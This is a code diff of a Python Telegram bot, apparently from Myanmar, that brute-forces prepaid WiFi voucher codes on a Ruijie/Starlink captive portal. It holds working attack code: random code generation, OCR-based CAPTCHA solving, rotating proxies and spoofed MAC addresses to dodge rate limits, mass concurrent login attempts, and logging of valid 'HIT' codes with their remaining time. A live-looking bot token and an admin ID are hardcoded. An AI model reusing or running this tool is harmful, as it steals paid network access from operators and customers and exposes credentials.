@@ -1,937 +1,734 @@
-#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-================================================================================
- sirzipp.py  —  ⚡ SAGE ⚡
- Starlink (Ruijie) Voucher Scanner + Telegram Bot   |   Telegram @mzw1mzw99761
---------------------------------------------------------------------------------
- GitHub license system ကို ဖြုတ်ပြီး ကုဒ်ကျမြနါအောင် ပြင်ဆင်ထားသည်။
- Requires:
-     pip install aiohttp aiohttp-socks ddddocr python-telegram-bot requests
-================================================================================
-"""
-
-import os
-import sys
-import re
-import json
-import time
-import random
-import string
-import hashlib
-import asyncio
-import datetime
-import requests
-
-from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
-
-import aiohttp
-from aiohttp_socks import ProxyConnector, ProxyType
-
-import ddddocr
-
-from telegram import (
-    Update,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-)
-from telegram.constants import ParseMode
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    MessageHandler,
-    CallbackQueryHandler,
-    ContextTypes,
-    filters,
-)
-
-# ==============================================================================
-#  CONFIG / CONSTANTS
-# ==============================================================================
+import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
+from datetime import datetime, timezone
+from telebot.async_telebot import AsyncTeleBot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiohttp import web
+import cv2, ddddocr, numpy as np
+from collections import deque
 
 BOT_TOKEN = "8858819080:AAFZV2QIcZ8ZcIr8navp0y-cG31JYvH7NWk"
-ADMIN_IDS = [7294591323]
+ADMIN_ID = "7294591323"
 
-FILE_PATH = "allinone.txt"            # valid (HIT) codes are appended here
-LAST_RUN_FILE = "last_run.txt"        # anti time-rollback watchdog
-PROXY_FILE = "proxies.txt"            # proxy list
-PORTAL_URL_PATH = "portal_url_"       # per-user portal url: portal_url_<uid>.txt
+# ════════════════════════════════════════════════════════════════
+#  ​ရောင်ရန်မဟုပါ သကယ်လို့​ရောင် ခြင်စိတ်ဖစ်လာရင်
+#            ဖင်သာ​ပြေးခံပါ ════════════════════════════════════════════════════════════════
+CONCURRENCY = 15000
+BATCH_SIZE = 10000
+TIMEOUT = 100
 
-MAX_CODES_PER_SESSION = 30            # codes per aiohttp session (proxy rotate)
-MAX_CODES_PER_SID = 30                # codes per gateway sessionId
-NUM_WORKERS = 300                     # parallel workers
-TIMEOUT_SEC = 30                      # per-request timeout
+bot = AsyncTeleBot(BOT_TOKEN)
+user_data = {}
+scan_tasks = {}
+success_texts = {}
+limited_texts = {}
+success_messages = {}
+limited_messages = {}
+retry_counts = {}
 
-DEFAULT_EXPIRY = "2099-12-31 23:59:59"
+session = None
+_connector = None
+_voucher_sem = None
+_start_time = time.monotonic()
+_ocr = None
 
-# --- Ruijie Starlink portal endpoints ---------------------------------------
-PORTAL_BASE = "https://portal-as.ruijienetworks.com"
-PORTAL_INDEX = PORTAL_BASE + "/download/static/maccauth/src/index.html"
-PORTAL_BALANCE_PAGE = PORTAL_BASE + "/download/static/maccauth/src/balance.html?sessionId="
-VOUCHER_URL = PORTAL_BASE + "/api/auth/voucher/?lang=en_US"
-CAPTCHA_IMAGE_URL = PORTAL_BASE + "/api/auth/captcha/image"
-CAPTCHA_VERIFY_URL = PORTAL_BASE + "/api/auth/captcha/verify"
-BALANCE_API = PORTAL_BASE + "/api/auth/balance/getBalance/"
+async def answer_callback(call, text=None, show_alert=False):
+    await bot.answer_callback_query(call.id, text=text, show_alert=show_alert)
 
-# --- code char sets ---------------------------------------------------------
-CHARSET_DIGITS = "0123456789"
-CHARSET_ABC = "abcdefghijkmnopqrstuvwxyz"
-CHARSET_MIX = "0123456789abcdefghijkmnopqrstuvwxyz"
+def get_ocr():
+    global _ocr
+    if _ocr is None:
+        _ocr = ddddocr.DdddOcr(show_ad=False)
+    return _ocr
 
-MODES = {
-    "num6": "Number 6",
-    "num7": "Number 7",
-    "num8": "Number 8",
-    "num9": "Number 9",
-    "mix6": "Mix 6",
-    "abc6": "ABC 6",
-    "custom": "Custom Start",
-}
+STATE_FILE = "state.json"
+HITS_FILE = "hits.json"
 
-# --- terminal colors --------------------------------------------------------
-bred = "\x1b[1;31m"
-bgreen = "\x1b[1;32m"
-bcyan = "\x1b[1;36m"
-white = "\x1b[37m"
-yellow = "\x1b[33m"
-reset = "\x1b[0m"
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
-]
-
-# --- globals ----------------------------------------------------------------
-_ocr_instance = None
-_proxy_manager = None
-user_scanners = {}      # user_id -> scanner-state dict
-
-
-# ==============================================================================
-#  BANNER
-# ==============================================================================
-
-def show_banner():
-    line = "=" * 60
-    print(bcyan + line)
-    print("   ⚡ SAGE  ⚡   ")
-    print("        Telegram @Htun     ")
-    print(line + reset)
-
-
-def check_time_integrity():
-    """Refuse to run if system clock was rolled back (writes a datetime stamp)."""
-    now = datetime.datetime.now()
-    last_run_time = None
-    if os.path.exists(LAST_RUN_FILE):
-        try:
-            with open(LAST_RUN_FILE) as f:
-                raw_text = f.read().strip()
-            if raw_text:
-                last_run_time = datetime.datetime.strptime(raw_text, "%Y-%m-%d %H:%M:%S")
-        except (OSError, ValueError):
-            last_run_time = None
-    if last_run_time and now < last_run_time:
-        print(bred + "[!] ERROR: TIME ROLLBACK DETECTED! STOPPING..." + reset)
-        sys.exit(1)
+def save_state():
     try:
-        with open(LAST_RUN_FILE, "w") as f:
-            f.write(now.strftime("%Y-%m-%d %H:%M:%S"))
-    except OSError:
-        pass
+        payload = {"user_data": {str(k): v for k, v in user_data.items()}}
+        with open(STATE_FILE, "w") as f:
+            json.dump(payload, f)
+    except Exception as e:
+        print(f"[err] {e}")
 
+def load_state():
+    global user_data
+    if not os.path.exists(STATE_FILE):
+        return
+    try:
+        with open(STATE_FILE) as f:
+            payload = json.load(f)
+        for k, v in payload.get("user_data", {}).items():
+            user_data[int(k)] = v
+    except Exception as e:
+        print(f"[err] {e}")
 
-# ==============================================================================
-#  PROXY MANAGER
-# ==============================================================================
+def save_hits():
+    try:
+        with open(HITS_FILE, "w") as f:
+            json.dump({str(k): v for k, v in success_texts.items()}, f, indent=2)
+    except Exception as e:
+        print(f"[err] {e}")
 
-class ProxyManager:
-    """Round-robin SOCKS/HTTP proxy pool with bad-proxy marking."""
-
-    def __init__(self, file_path):
-        self.file_path = file_path
-        self.proxies = []
-        self.bad_proxies = []
-        self.lock = asyncio.Lock()
-        self.index = 0
-        self.load()
-
-    def _normalize(self, proxy):
-        proxy = (proxy or "").strip()
-        if not proxy:
-            return None
-        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
-            proxy = "socks5://" + proxy
-        return proxy
-
-    def load(self):
-        try:
-            with open(self.file_path) as f:
-                raw = [self._normalize(p) for p in f.read().splitlines()]
-            self.proxies = [p for p in raw if p]
-            random.shuffle(self.proxies)
-            self.bad_proxies = []
-            print(f"[ProxyManager] Loaded {len(self.proxies)} active proxies")
-        except Exception as e:
-            print(f"[ProxyManager] Load error: {e}")
-
-    def reload(self):
-        self.load()
-
-    async def get_next(self):
-        async with self.lock:
-            if not self.proxies:
-                return None
-            p = self.proxies[self.index % len(self.proxies)]
-            self.index += 1
-            return p
-
-    async def mark_bad(self, proxy):
-        if not proxy:
+def load_hits():
+    try:
+        if not os.path.exists(HITS_FILE):
             return
-        async with self.lock:
-            if proxy in self.proxies:
-                self.proxies = [p for p in self.proxies if p != proxy]
-                self.bad_proxies.append(proxy)
-
-    def stats(self):
-        total = len(self.proxies) + len(self.bad_proxies)
-        bad = len(self.bad_proxies)
-        return total, bad
-
-
-def get_proxy_manager():
-    global _proxy_manager
-    if _proxy_manager is None:
-        _proxy_manager = ProxyManager(PROXY_FILE)
-    return _proxy_manager
-
-
-def create_connector_for_proxy(proxy):
-    try:
-        return ProxyConnector.from_url(proxy)
-    except Exception:
-        return None
-
-
-# ==============================================================================
-#  OCR / CAPTCHA
-# ==============================================================================
-
-def get_ocr_instance():
-    global _ocr_instance
-    if _ocr_instance is None:
-        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
-    return _ocr_instance
-
-
-def ocr_image_bytes_fast(image_bytes: bytes) -> str:
-    ocr = get_ocr_instance()
-    result = ocr.classification(image_bytes)
-    return result
-
-
-async def solve_captcha_simple_async(session, captcha_url, headers):
-    try:
-        async with session.get(captcha_url, headers=headers,
-                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)) as resp:
-            image_content = await resp.read()
-        return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
-    except Exception:
-        return None
-
-
-# ==============================================================================
-#  USER DATA
-# ==============================================================================
-
-def get_user_data(user_id: int):
-    """Return the portal URL saved for this user (or None)."""
-    p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
-    saved_url = None
-    if os.path.exists(p_file):
-        try:
-            with open(p_file) as f:
-                saved_url = f.read().strip()
-        except OSError:
-            saved_url = None
-    return saved_url
-
-
-def generate_random_mac():
-    return ":".join("%02x" % random.randint(0, 255) for _ in range(6))
-
-
-def build_headers(referer=PORTAL_INDEX):
-    return {
-        "accept": "application/json, text/javascript, */*; q=0.01",
-        "accept-language": "en-US,en;q=0.9",
-        "content-type": "application/json; charset=utf-8",
-        "user-agent": random.choice(USER_AGENTS),
-        "x-requested-with": "XMLHttpRequest",
-        "Origin": PORTAL_BASE,
-        "Referer": referer,
-    }
-
-
-# ==============================================================================
-#  GATEWAY / SESSION
-# ==============================================================================
-
-async def get_sid_from_gateway(session, portal_url, user_id):
-    """
-    Load the portal login page, follow its JS `location.href=...` chain and
-    return the gateway sessionId (and the final landing URL).
-    """
-    current_url = portal_url
-    try:
-        for _ in range(3):
-            async with session.get(current_url, headers=build_headers(current_url),
-                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
-                                   ssl=False, allow_redirects=True) as resp:
-                body = await resp.text()
-                final_url = str(resp.url)
-
-            match = re.search(r"location\.href\s*=\s*[\'\"]([^\'\"]+)[\'\"]", body)
-            if match:
-                current_url = urljoin(final_url, match.group(1))
+        with open(HITS_FILE) as f:
+            payload = json.load(f)
+        for k, v in payload.items():
+            try:
+                success_texts[int(k)] = v
+            except ValueError:
                 continue
+    except Exception as e:
+        print(f"[err] {e}")
 
-            token_match = re.search(r"token=([^&\s\"\'<>]+)", body)
-            if token_match:
-                current_url = urljoin(final_url, current_url.split("?")[0] + "?token=" + token_match.group(1))
-            break
+_web_start = time.time()
 
-        parsed_query = parse_qs(urlparse(current_url).query)
-        sid = parsed_query.get("sessionId", [None])[0]
-        if not sid:
-            token_match = re.search(r"token=([^&\s\"\'<>]+)", current_url)
-            if token_match:
-                sid = token_match.group(1)
-        return sid, current_url
-    except Exception:
-        return None, None
+async def handle(request):
+    up = int(time.time() - _web_start)
+    h, r = divmod(up, 3600)
+    m, s = divmod(r, 60)
+    return web.json_response({
+        "status": "alive",
+        "bot": "LORD OF DARKNESS MMHA",
+        "uptime": f"{h}h {m}m {s}s"
+    })
 
+async def web_server():
+    app = web.Application()
+    app.router.add_get("/", handle)
+    app.router.add_get("/ping", handle)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.environ.get("PORT", 8099))
+    site = web.TCPSite(runner, "0.0.0.0", port)
+    await site.start()
 
-# ==============================================================================
-#  BALANCE
-# ==============================================================================
+# ==========================================
+# BUTTON MENUS SYSTEM
+# ==========================================
 
-async def fetch_balance(active_token: str, code: str, proxy: str) -> str:
-    """Fetch profile name + remaining minutes for a HIT code."""
-    connector = create_connector_for_proxy(proxy) if proxy else None
-    try:
-        async with aiohttp.ClientSession(connector=connector) as session:
-            balance_url = BALANCE_API + "?sessionId=" + str(active_token) + "&lang=en_US"
-            async with session.get(balance_url, headers=build_headers(),
-                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
-                                   ssl=False) as resp:
-                if resp.status != 200:
-                    return f"❌ HTTP {resp.status}"
-                try:
-                    data = await resp.json(content_type=None)
-                except Exception as json_err:
-                    return f"❌ JSON Error: {json_err}"
-                profile_name = data.get("profileName", "N/A")
-                total_minutes = data.get("totalMinutes", 0)
-                return f"📏: {profile_name}, ⏰: {total_minutes}"
-    except Exception:
-        return "N/A"
-    finally:
-        if connector is not None:
-            try:
-                await connector.close()
-            except Exception:
-                pass
-
-
-async def check_balance(active_token, code, user_id, proxy_str):
-    """Report a HIT (with balance info) to the user and log it to file."""
-    balance_str = "...fetching..."
-    hit_str = f"✅ HIT: `{code}`\n{balance_str}"
-    try:
-        with open(FILE_PATH, "a") as f:
-            f.write(code + "\n")
-    except OSError:
-        pass
-    try:
-        await proxy_str  # allow passing a coroutine/future for the proxy
-    except TypeError:
-        pass
-    balance = await fetch_balance(active_token, code, proxy_str if isinstance(proxy_str, str) else None)
-    hit_str = f"✅ HIT: `{code}`\n{balance}\n⚔️ Expired: N/A"
-    return hit_str
-
-
-# ==============================================================================
-#  CORE CHECKER
-# ==============================================================================
-
-async def check_single_access_code(session, code, current_session_id,
-                                   login_url, captcha_base_url, verify_url,
-                                   headers, user_id, current_proxy):
-    """
-    Check one voucher code:
-      1. GET captcha image (OCR via ddddocr)
-      2. POST captcha/verify
-      3. POST voucher login  ->  '"success":true' == HIT
-    Returns a status string: 'hit' / 'limit' / 'bad' / 'net' / 'captcha'
-    """
-    try:
-        captcha_url = captcha_base_url + str(int(time.time() * 1000))
-        captcha_text = await solve_captcha_simple_async(session, captcha_url, headers)
-        if not captcha_text:
-            return "net"
-
-        # --- captcha verify ---------------------------------------------------
-        v_payload = {"authCode": captcha_text, "sessionId": current_session_id}
-        async with session.post(verify_url, json=v_payload, headers=headers,
-                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
-                                ssl=False) as v_resp:
-            v_data = await v_resp.text()
-        if '"success":true' not in v_data.replace(" ", ""):
-            return "captcha"
-
-        # --- voucher login ----------------------------------------------------
-        mac = generate_random_mac()
-        l_payload = {
-            "accessCode": code,
-            "authCode": captcha_text,
-            "mac": mac,
-            "apiVersion": "3.0.0",
-        }
-        async with session.post(login_url, json=l_payload, headers=headers,
-                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
-                                ssl=False) as l_resp:
-            body = await l_resp.text()
-
-        body_snippet = body[:300]
-        if '"success":true' in body.replace(" ", ""):
-            # extract active token / sessionId for balance lookup
-            active_token = current_session_id
-            try:
-                j = json.loads(body)
-                active_token = j.get("sessionId") or j.get("token") or current_session_id
-            except Exception:
-                pass
-            return "hit"
-
-        if ("request limited" in body) or ("the number of sta exceeds the limit" in body):
-            return "limit"
-
-        return "bad"
-    except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
-        return "net"
-    except asyncio.CancelledError:
-        raise
-    except Exception:
-        return "net"
-
-
-# ==============================================================================
-#  WORKER / SCANNER
-# ==============================================================================
-
-def make_code(mode, start_digit=6, counter=None):
-    if mode == "custom" and counter is not None:
-        return str(counter).zfill(6)
-    if mode == "num6":
-        return "".join(random.choice(CHARSET_DIGITS) for _ in range(6))
-    if mode == "num7":
-        return "".join(random.choice(CHARSET_DIGITS) for _ in range(7))
-    if mode == "num8":
-        return "".join(random.choice(CHARSET_DIGITS) for _ in range(8))
-    if mode == "num9":
-        return "".join(random.choice(CHARSET_DIGITS) for _ in range(9))
-    if mode == "mix6":
-        return "".join(random.choice(CHARSET_MIX) for _ in range(6))
-    if mode == "abc6":
-        return "".join(random.choice(CHARSET_ABC) for _ in range(6))
-    return "".join(random.choice(CHARSET_DIGITS) for _ in range(6))
-
-
-async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
-    """One scanning worker: owns a proxied session, rotates SID/session."""
-    pm = get_proxy_manager()
-    state = user_scanners.get(user_id)
-    if state is None:
-        return
-    stop_event = state["stop_event"]
-    mode = state.get("mode", "num6")
-    start_digit = state.get("start_digit", 6)
-    tried_codes = state["tried_codes"]
-
-    while not stop_event.is_set():
-        proxy = await pm.get_next()
-        connector = create_connector_for_proxy(proxy) if proxy else None
-        session = aiohttp.ClientSession(
-            connector=connector,
-            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
-            headers={"user-agent": random.choice(USER_AGENTS)},
+def main_control_menu(chat_id):
+    has_link = chat_id in user_data and 'session_url' in user_data[chat_id]
+    is_scanning = chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done()
+    
+    markup = InlineKeyboardMarkup(row_width=2)
+    
+    if is_scanning:
+        markup.add(
+            InlineKeyboardButton("🎃 ရပ်တန့်ရန်", callback_data="btn_stop_ritual"),
+            InlineKeyboardButton("☠️ Status", callback_data="btn_realm_status")
         )
-        try:
-            sid, _gateway = await get_sid_from_gateway(session, state["portal_url"], user_id)
-            if not sid:
-                await pm.mark_bad(proxy)
-                state["net"] += 1
-                await asyncio.sleep(1)
-                continue
-
-            codes_checked_this_sid = 0
-            sid_failures = 0
-            codes_checked_this_session = 0
-
-            while (codes_checked_this_session < MAX_CODES_PER_SESSION
-                   and codes_checked_this_sid < MAX_CODES_PER_SID
-                   and not stop_event.is_set()):
-
-                # ---- pick a code -------------------------------------------------
-                for _ in range(20):
-                    if mode == "custom":
-                        state["counter"] += 1
-                        code = make_code(mode, start_digit, state["counter"])
-                    else:
-                        code = make_code(mode, start_digit)
-                    if code not in tried_codes:
-                        break
-                else:
-                    break
-                tried_codes.add(code)
-                state["current_code"] = code
-
-                result = await check_single_access_code(
-                    session, code, sid,
-                    login_url, captcha_base_url, verify_url,
-                    headers, user_id, proxy,
-                )
-                codes_checked_this_sid += 1
-                codes_checked_this_session += 1
-                state["tried"] += 1
-
-                if result == "hit":
-                    state["hits"] += 1
-                    state["hit_list"].append(code)
-                    state["last_hit"] = code
-                    state["recent_logs"].append(f"✅ HIT: {code}")
-                    msg = await check_balance(sid, code, user_id, proxy)
-                    try:
-                        await state["context"].bot.send_message(
-                            chat_id=user_id, text=msg, parse_mode=ParseMode.MARKDOWN)
-                    except Exception:
-                        pass
-                    # fresh session after a hit
-                    break
-
-                elif result == "limit":
-                    state["limits"] += 1
-                    state["recent_logs"].append(f"⚠️ LIMIT: {code}")
-                    break  # rotate SID
-
-                elif result == "net":
-                    state["net"] += 1
-                    state["recent_logs"].append(f"❌ Net/Other: {code}")
-                    sid_failures += 1
-                    if sid_failures >= 3:
-                        await pm.mark_bad(proxy)
-                        break
-
-                elif result == "captcha":
-                    state["failed"] += 1
-
-                else:
-                    state["failed"] += 1
-
-                await asyncio.sleep(0)
-        except asyncio.CancelledError:
-            raise
-        except Exception:
-            state["net"] += 1
-        finally:
-            try:
-                await session.close()
-            except Exception:
-                pass
-        if stop_event.is_set():
-            break
-        await asyncio.sleep(0.05)
-
-
-async def live_dashboard_updater(context: "ContextTypes.DEFAULT_TYPE", user_id: int):
-    """Periodically refresh the live stats dashboard message."""
-    state = user_scanners.get(user_id)
-    if state is None:
-        return
-    stop_event = state["stop_event"]
-    dash_msg_id = state.get("dash_msg_id")
-    pm = get_proxy_manager()
-    try:
-        while not stop_event.is_set():
-            await asyncio.sleep(5)
-            if stop_event.is_set():
-                break
-            elapsed = max(time.time() - state["start_time"], 1)
-            speed_cpm = int(state["tried"] / elapsed * 60)
-            total, bad = pm.stats()
-            active = total - bad
-            recent_logs = state["recent_logs"][-5:]
-            last_log = recent_logs[-1] if recent_logs else "None yet"
-            text = (
-                "⚡ Scanner Running ⚡\n"
-                "Thank for using By Telegram @sayarkn\n"
-                "━━━━━━━━━━━━━━━━━━\n"
-                f"🎯 Tried: {state['tried']}\n"
-                f"🔥 Hits: {state['hits']}\n"
-                f"⚠️ Limits: {state['limits']}\n"
-                f"❌ Net/Other: {state['net']}\n"
-                f"⚡ Speed: {speed_cpm} c/m\n🔁 Proxies: {active}\n"
-                f"🔥 Last: {state['last_hit'] or 'None yet'}\n"
-                f"🎯 Current Code: {state['current_code'] or '-'}\n"
-                f"📋 Last log: {last_log}"
-            )
-            try:
-                await context.bot.edit_message_text(
-                    chat_id=user_id, message_id=dash_msg_id, text=text)
-            except Exception:
-                pass
-    except asyncio.CancelledError:
-        raise
-
-
-async def run_user_scanner(context: "ContextTypes.DEFAULT_TYPE", user_id: int):
-    """Launch NUM_WORKERS workers + the live dashboard for one user."""
-    if user_scanners.get(user_id, {}).get("running"):
-        return
-    portal_url = get_user_data(user_id) or PORTAL_INDEX
-
-    state = {
-        "running": True,
-        "context": context,
-        "portal_url": portal_url,
-        "mode": context.user_data.get("selected_mode", "num6"),
-        "start_digit": context.user_data.get("start_digit", 6),
-        "counter": int(context.user_data.get("start_digit", 6)) * 100000,
-        "stop_event": asyncio.Event(),
-        "tried": 0, "hits": 0, "limits": 0, "net": 0, "failed": 0,
-        "hit_list": [], "valid_codes": [], "tried_codes": set(),
-        "recent_logs": [], "last_hit": None, "current_code": None,
-        "start_time": time.time(),
-    }
-    user_scanners[user_id] = state
-
-    pm = get_proxy_manager()
-    total, bad = pm.stats()
-    if total - bad <= 0:
-        await context.bot.send_message(
-            chat_id=user_id,
-            text="⚠️ **No proxies loaded!**\n\n"
-                 "📥 **Proxy စာသားကို ထည့်သွင်းဖို့ စောင့်ဆိုင်းပါသည်**",
-            parse_mode=ParseMode.MARKDOWN)
-        state["running"] = False
-        return
-
-    dash = await context.bot.send_message(chat_id=user_id,
-                                          text="🔄 Initializing scanner dashboard...")
-    state["dash_msg_id"] = dash.message_id
-
-    headers = build_headers()
-    tasks = [asyncio.create_task(
-        worker(i, VOUCHER_URL,
-               CAPTCHA_IMAGE_URL + "?sessionId=",
-               CAPTCHA_VERIFY_URL, headers, user_id))
-        for i in range(NUM_WORKERS)]
-    tasks.append(asyncio.create_task(live_dashboard_updater(context, user_id)))
-    state["tasks"] = tasks
-
-    try:
-        await state["stop_event"].wait()
-    finally:
-        for t in tasks:
-            if not t.done():
-                t.cancel()
-        await asyncio.gather(*tasks, return_exceptions=True)
-
-        elapsed = max(time.time() - state["start_time"], 1)
-        speed_cpm = int(state["tried"] / elapsed * 60)
-        total, bad = pm.stats()
-        hit_str = "\n".join(state["hit_list"]) if state["hit_list"] else "None"
-        final_text = (
-            "🛑 Scanner Stopped/Finished\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            f"🔋 Total Tried: {state['tried']}\n"
-            f"🔥 Hits: {state['hits']}\n"
-            f"⚡ Final Speed: {speed_cpm} c/m\n"
-            f"🔁 Proxies: {total - bad}\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            f"📋 **All Hit Codes**:\n{hit_str}"
-        )
-        try:
-            await context.bot.send_message(chat_id=user_id, text=final_text,
-                                           parse_mode=ParseMode.MARKDOWN)
-        except Exception:
-            pass
-        state["running"] = False
-
-
-# ==============================================================================
-#  TELEGRAM UI
-# ==============================================================================
-
-def get_main_menu_markup():
-    keyboard = [
-        [InlineKeyboardButton("🌐 Update Portal", callback_data="btn_update_portal")],
-        [InlineKeyboardButton("⚙️ Mode", callback_data="btn_mode_menu"),
-         InlineKeyboardButton("➕ Add Proxies", callback_data="btn_add_proxies")],
-        [InlineKeyboardButton("🚀 Start Scanner", callback_data="btn_start_scanner"),
-         InlineKeyboardButton("🛑 Stop", callback_data="stop_scan")],
-    ]
-    return InlineKeyboardMarkup(keyboard)
-
-
-def get_mode_menu_markup():
-    keyboard = [
-        [InlineKeyboardButton("Number 6", callback_data="set_mode_num6"),
-         InlineKeyboardButton("Number 7", callback_data="set_mode_num7")],
-        [InlineKeyboardButton("Number 8", callback_data="set_mode_num8"),
-         InlineKeyboardButton("Number 9", callback_data="set_mode_num9")],
-        [InlineKeyboardButton("Mix 6", callback_data="set_mode_mix6"),
-         InlineKeyboardButton("Custom Start", callback_data="set_mode_custom")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="btn_back_main")],
-    ]
-    return InlineKeyboardMarkup(keyboard)
-
-
-def admin_only(func):
-    async def wrapper(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
-        user = update.effective_user
-        if not user or user.id not in ADMIN_IDS:
-            await update.effective_message.reply_text(
-                "⛔ Bot ကို အလွန်အကျွံ အသုံးမပြုပါနဲ့။ "
-                "အလွန်အကျွံ အသုံးပြုရင် telegram @sayarkn ဆီ ရင်းပါ")
-            return
-        return await func(update, context, *args, **kwargs)
-    return wrapper
-
-
-async def start(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
-    user_id = update.effective_user.id
-    mode = context.user_data.get("selected_mode", "num6")
-    saved_url = get_user_data(user_id)
-    pm = get_proxy_manager()
-    total, bad = pm.stats()
-    if saved_url:
-        text = ("⚡ **Starlink Scanner Control Panel** ⚡\n\n"
-                f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
-                f"🔁 Proxies: `{total - bad}`\n"
-                "🌐 Portal: ready ✅")
     else:
-        text = ("⚡ **Starlink Scanner Control Panel** ⚡\n\n"
-                f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
-                f"🔁 Proxies: `{total - bad}`\n"
-                "❌ Portal URL မရှိသေးပါက ပြောင်းဖို့ `Update Portal` ခလုတ်ကို နှိပ်ပါ")
-    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
-                                    reply_markup=get_main_menu_markup())
-
-
-@admin_only
-async def add_proxies_cmd(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
-    context.user_data["waiting_for_proxy_text"] = True
-    await update.message.reply_text(
-        "📥 **Proxy စာသားကို ထည့်သွင်းဖို့ စောင့်ဆိုင်းပါသည်**\n"
-        "အောက်ပါ format နဲ့ proxy အားလုံး\n"
-        "ဥပမာ -\n"
-        "123.45.67.89:8080\n"
-        "socks5://user:pass@host:1080\n"
-        "socks4://host:1080",
-        parse_mode=ParseMode.MARKDOWN)
-
-
-async def handle_callbacks(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
-    query = update.callback_query
-    user_id = update.effective_user.id
-    data = query.data
-    await query.answer()
-
-    mode = context.user_data.get("selected_mode", "num6")
-    pm = get_proxy_manager()
-    total, bad = pm.stats()
-    active = total - bad
-
-    if data.startswith("set_mode_"):
-        new_mode = data[len("set_mode_"):]
-        context.user_data["selected_mode"] = new_mode
-        mode = new_mode
-        if new_mode == "custom":
-            context.user_data["waiting_for_digit"] = True
-            await query.edit_message_text(
-                "🔢 **Start Digit **\nစတင်မည့် ဂဏန်းကို ပြောင်းရန် လိုအပ်ပါ",
-                parse_mode=ParseMode.MARKDOWN,
-                reply_markup=InlineKeyboardMarkup(
-                    [[InlineKeyboardButton("⬅️ Back", callback_data="btn_mode_menu")]]))
-            return
-        await query.edit_message_text(
-            f"✅ Mode ပြောင်းဖို့ ပြုလုပ်ပြီးပါပြီ\n\n"
-            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
-            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
-            f"🔁 Proxies: `{active}`",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=get_main_menu_markup())
-
-    elif data == "btn_update_portal":
-        context.user_data["waiting_for_portal_url"] = True
-        await query.edit_message_text(
-            "🌐 **Portal URL မရှိသေးပါ ထည့်ဖို့ လိုအပ်ပါ**\n"
-            "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
-            parse_mode=ParseMode.MARKDOWN)
-
-    elif data == "btn_mode_menu":
-        await query.edit_message_text("⚙️ **Choose Scanner Mode**",
-                                      parse_mode=ParseMode.MARKDOWN,
-                                      reply_markup=get_mode_menu_markup())
-
-    elif data == "btn_add_proxies":
-        context.user_data["waiting_for_proxy_text"] = True
-        await query.edit_message_text(
-            "📥 **Proxy စာသားကို ထည့်သွင်းဖို့ စောင့်ဆိုင်းပါသည်**\n"
-            "အောက်ပါ format နဲ့ proxy အားလုံး\nဥပမာ -\n"
-            "123.45.67.89:8080\nsocks5://user:pass@host:1080\nsocks4://host:1080",
-            parse_mode=ParseMode.MARKDOWN)
-
-    elif data == "btn_start_scanner":
-        await query.edit_message_text("🚀 Scanner စတင်ပါပြီ...")
-        asyncio.get_event_loop().create_task(run_user_scanner(context, user_id))
-
-    elif data == "stop_scan":
-        state = user_scanners.get(user_id)
-        if state and not state["stop_event"].is_set():
-            state["stop_event"].set()
-            await query.edit_message_text("🛑 Scanner ရပ်တန့်ပါပြီ")
+        if not has_link:
+            markup.add(
+                InlineKeyboardButton("☣️ Link ချိတ်ရန်", callback_data="btn_guide_bind"),
+                InlineKeyboardButton("🤖 လမ်းညွှန်", callback_data="btn_ai_guide")
+            )
         else:
-            await query.edit_message_text("ℹ️ Scanner မလည်ပါနေပါ")
+            markup.add(
+                InlineKeyboardButton("👁️ Scan စတင်ရန်", callback_data="btn_open_scan_menu"),
+                InlineKeyboardButton("🗡️ Recheck", callback_data="btn_recheck_saved")
+            )
+            markup.add(
+                InlineKeyboardButton("⚰️ သိမ်းထားသော Hits", callback_data="btn_view_saved"),
+                InlineKeyboardButton("⚧️ Link ပြောင်းရန်", callback_data="btn_guide_bind")
+            )
+            markup.add(
+                InlineKeyboardButton("☠️ Status", callback_data="btn_realm_status"),
+                InlineKeyboardButton("🤖 လမ်းညွှန်", callback_data="btn_ai_guide")
+            )
+            
+    return markup
 
-    elif data == "btn_back_main":
-        saved_url = get_user_data(user_id)
-        portal_line = "🌐 Portal: ready ✅" if saved_url else \
-            "❌ Portal URL မရှိသေးပါက ပြောင်းဖို့ `Update Portal` ခလုတ်ကို နှိပ်ပါ"
